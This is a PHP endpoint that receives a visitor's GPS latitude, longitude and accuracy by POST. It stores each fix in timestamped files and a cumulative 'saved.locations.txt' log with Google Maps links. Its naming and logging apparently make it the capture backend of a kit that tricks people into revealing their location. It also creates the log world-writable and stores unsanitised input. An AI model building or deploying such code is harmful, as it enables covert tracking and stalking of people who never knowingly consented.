<?php
require_once __DIR__ . '/session_helper.php';

$date = date('dMYHis');
$latitude  = isset($_POST['lat']) ? $_POST['lat'] : 'Unknown';
$longitude = isset($_POST['lon']) ? $_POST['lon'] : 'Unknown';
$accuracy  = isset($_POST['acc']) ? $_POST['acc'] : 'Unknown';

if (!empty($_POST['lat']) && !empty($_POST['lon'])) {
    file_put_contents($session_dir . 'LocationLog.log', "Location captured\n", FILE_APPEND);

    $data = "Latitude: " . $latitude . "\r\n" .
            "Longitude: " . $longitude . "\r\n" .
            "Accuracy: " . $accuracy . " meters\r\n" .
            "Google Maps: https://www.google.com/maps/place/" . $latitude . "," . $longitude . "\r\n" .
            "Date: " . $date . "\r\n";

    $file = $session_dir . 'location_' . $date . '.txt';

    try {
        $fp = fopen($file, 'w');
        if ($fp) {
            fwrite($fp, $data);
            fclose($fp);

            $console_log = fopen($session_dir . 'current_location.txt', 'w');
            fwrite($console_log, $data);
            fclose($console_log);

            $masterFile = $session_dir . 'saved.locations.txt';
            if (!file_exists($masterFile)) {
                touch($masterFile);
                chmod($masterFile, 0666);
            }
            $fp = fopen($masterFile, 'a');
            if ($fp) {
                fwrite($fp, "\n=== New Location Captured ===\n" . $data . "\n");
                fclose($fp);
            }

            header('Content-Type: application/json');
            echo json_encode(['status' => 'success', 'message' => 'Location data received']);
        } else {
            throw new Exception("Could not open file for writing");
        }
    } catch (Exception $e) {
        header('Content-Type: application/json');
        echo json_encode(['status' => 'error', 'message' => 'Could not save location data']);
    }
} else {
    header('Content-Type: application/json');
    echo json_encode(['status' => 'error', 'message' => 'Location data missing or incomplete']);
}

exit();
?>